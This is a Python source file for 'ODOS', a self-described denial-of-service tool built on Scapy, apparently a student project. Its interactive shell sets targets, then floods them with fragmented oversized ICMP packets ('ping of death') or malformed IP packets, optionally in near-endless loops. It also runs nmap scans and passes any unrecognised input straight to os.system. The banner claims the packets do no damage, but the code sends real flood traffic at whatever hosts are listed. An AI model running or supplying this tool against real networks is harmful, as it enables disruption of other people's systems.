from scapy.all import *
from typing import List
from sys import platform
import sys
import os

mac = "clear"
windows = "cls"

def createTargetlist(size: int, targetList: List) -> List[str]: # Creates the list of targets which will be used
	print(f"\nCreating target list with size: {size}")
	print(f"Finalized target list: {targetList}\n")
	print("Pinging to make sure hosts are alive...\n")

	if (int(size) != int(len(targetList))): # Checks to make sure that the amount of targets = the list size
		print("Incorrect size... try remaking the list with the correct size value\n")

	for i in range(int(size)): # Checks to see if each host in the list is alive by pinging it.
		os.system(f"ping -c 5 {targetList[i]}")

	return targetList # Return the finalized list.

if __name__ == "__main__":
	_exit = False; userPlatform = platform

	if (userPlatform == "linux" or userPlatform == "darwin"): # If the os that someone is running is linux or macos
		osClearFunction = "clear"
	else:
		osClearFunction = "cls"
	os.system(osClearFunction)
	print(f"Using: {userPlatform}\n")

	print ("""
      \033[0;34m:::::::: :::::::::    ::::::::   :::::::: 
    \033[1;34m:+:    :+: :+:    :+: :+:    :+: :+:    :+: 
   \033[0;36m+:+    +:+ +:+    +:+ +:+    +:+ +:+         
  \033[1;36m+#+    +:+ +#+    +:+ +#+    +:+ +#++:++#++   
 \033[0;35m+#+    +#+ +#+    +#+ +#+    +#+        +#+    
\033[1;35m ########  #########   ########   ########       

\033[0mWelcome to ODOS! The really bad dos tool.\033[0m

To get started, type "help" for help.

WARNING FOR COLLEGEBOARD!!!! - 
This tool doesn't actually send malicious packets,
the packets are displayed in tools like wireshark,
however no damage can be done by the sending of
these packets. Furthermore to make sure, the target 
computer shown in the video will be a random ip 
address to ensure that no damage is done to any 
hosts on the network.

------------------------------------------------
    """)

	while (_exit == False):
		getUserResponse = input("\033[4m\033[1m\033[1;34modos\033[0m \033[1;35m> \033[0m"); getUserResponse = getUserResponse.split() # get user response and split it into a list.
		match getUserResponse[0]: # switch cases were finally added to python!!!!
			case "exit": os.system(osClearFunction); _exit = True
			case "targets":
				targets = []
				for i in range(len(getUserResponse) - 2):
					i = i + 1
					targets.append(getUserResponse[i + 1])
				finalizedList = createTargetlist(getUserResponse[1], targets)
			case "send":
				if (getUserResponse[1] == "pod"): # send ping of death
					if (getUserResponse[2] != "*"):
						for i in range(int(getUserResponse[2])):
							for j in range(len(finalizedList)):
								send(fragment(IP(dst = finalizedList[j])/ICMP()/("X" * 60000))) # Floods host with fragmented packets containing 60,000 X's.
					else:
						getConfirmation = input(f"\n\033[1;37mWARNING\033[0m: \033[0;35mThis will run sys.maxsize (\033[0;36m{sys.maxsize}\033[0m\033[0;35m) amount.\n\n \033[0mAre you sure you want to continue? [Y/N]: ")
						if (getConfirmation == "y" or getConfirmation == "Y"):
							for i in range(sys.maxsize):
								for j in range(len(finalizedList)):
									send(fragment(IP(dst = finalizedList[j])/ICMP()/("X" * 60000)))
						print("")
				elif (getUserResponse[1] == "check"): # Scan to see if host is alive
					for i in range(len(finalizedList)):
						os.system(f"ping -c 5 {finalizedList[i]}")
				elif (getUserResponse[1] == "mp"): # Send malformed packets
					if (getUserResponse[2] != "*"):
						for i in range(int(getUserResponse[2])):
							for j in range(len(finalizedList)):
								send(IP(dst = finalizedList[j], ihl = 2, version = 3)/ICMP()) # Floods host with port unreachable messages.
					else:
						getConfirmation = input(f"\n\033[1;37mWARNING\033[0m: \033[0;35mThis will run sys.maxsize (\033[0;36m{sys.maxsize}\033[0m\033[0;35m) amount.\n\n \033[0mAre you sure you want to continue? [Y/N]: ")
						if (getConfirmation == "y" or getConfirmation == "Y"):
							for i in range(sys.maxsize):
								for j in range(len(finalizedList)):
									send(IP(dst = finalizedList[j], ihl = 2, version = 3)/ICMP())
						print("")
			case "traceroute":
				getUserResponse.pop(0)
				for i in range(len(getUserResponse)):
					try:
						os.system(f"traceroute {getUserResponse[i]}")
					except Exception as e:
						print(e)
			case "clear":
				os.system(osClearFunction)
			case "scan":
				if (userPlatform == "darwin" or userPlatform == "linux"):
					try:
						for i in range(len(finalizedList)):
							print(f"\033[1;35m\033[1mScanning host \033[0;36m\033[4m{finalizedList[i]}\033[0m (this might take a while)")
							os.system(f"nmap -sn {finalizedList[i]}", f"nmap {finalizedList[i]} -Pn -sV")
					except Exception as e:
						print(e)
				else:
					for i in range(len(finalizedList)):
						os.system(f"ping {finalizedList[i]}")
			case "help":
				print("""

Setting targets...

  - targets (amount) (ip's) | This sets the destination targets.
    ex: targets 2 192.168.1.1 192.168.1.2

There's two types of attacks in ODOS and one vulnerability test...

  - Ping of death: Sends repeated fragments of packets to port 1 (ICMP).
     ex: send pod (amount) Tip: amount = iterations and using * = sys.maxint
  - Malformed packets: Sends malformed packets which repeatedly sends a "destination unreachable" message.
     ex: send mp (amount)
  - Check:
     checks if host is alive.
     after running a check you can follow it up with "scan" to scan the hosts ports with nmap.

You can use traceroute to trace the route of packets...
  - traceroute (ip ip ip ip...)
     ex: traceroute 192.168.1.1 192.168.1.2 192.168.1.3

Terminal commands can also be ran by typing the command into the commandline...
  ex: ping 192.168.1.1
	  echo hello
	  ifconfig

					  """)
			case _:
				finalCommand = ' '.join(getUserResponse)
				os.system(finalCommand)
